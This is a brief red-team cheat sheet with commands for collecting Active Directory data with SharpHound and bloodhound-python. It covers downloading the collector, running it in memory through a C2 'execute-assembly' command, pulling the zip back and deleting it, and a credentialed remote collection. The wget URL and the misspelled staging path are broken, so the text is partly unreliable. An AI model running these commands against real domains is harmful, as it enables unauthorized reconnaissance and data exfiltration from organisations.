Basic SharpHound (w/domain joined system)
````
wget https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors/SharpHound.exe -O ~/Desktop/SharpHound.exe
execute-assembly ~/Desktop/SharpHound.exe --CollectionMethod All --Domain <customer domain> --OutputDirectory C:\Winodws\Tasks\
download C:\Winodws\Tasks\YYYYMMDD_BloodHound.zip
rm C:\Winodws\Tasks\YYYYMMDD_BloodHound.zip
````

BloodHound Python (nondomain joined on network, w/creds)
````
pip install bloodhound
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
````